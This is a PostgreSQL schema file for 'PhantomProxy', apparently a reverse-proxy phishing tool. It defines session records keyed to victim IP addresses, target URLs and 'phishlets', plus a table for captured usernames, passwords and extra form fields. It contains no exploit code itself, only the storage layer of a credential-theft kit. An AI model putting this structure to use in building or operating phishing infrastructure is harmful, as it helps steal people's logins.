-- PhantomProxy - PostgreSQL schema (for future migration from SQLite)
-- Run when switching to database_type: postgres

CREATE TABLE IF NOT EXISTS sessions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    victim_ip INET NOT NULL,
    target_url TEXT NOT NULL,
    phishlet_id TEXT,
    user_agent TEXT,
    ja3_hash TEXT,
    state TEXT DEFAULT 'active',
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_active TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_sessions_victim_ip ON sessions(victim_ip);
CREATE INDEX idx_sessions_created_at ON sessions(created_at DESC);

CREATE TABLE IF NOT EXISTS credentials (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id UUID REFERENCES sessions(id) ON DELETE CASCADE,
    username TEXT,
    password TEXT,
    custom_fields JSONB,
    captured_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_credentials_session_id ON credentials(session_id);
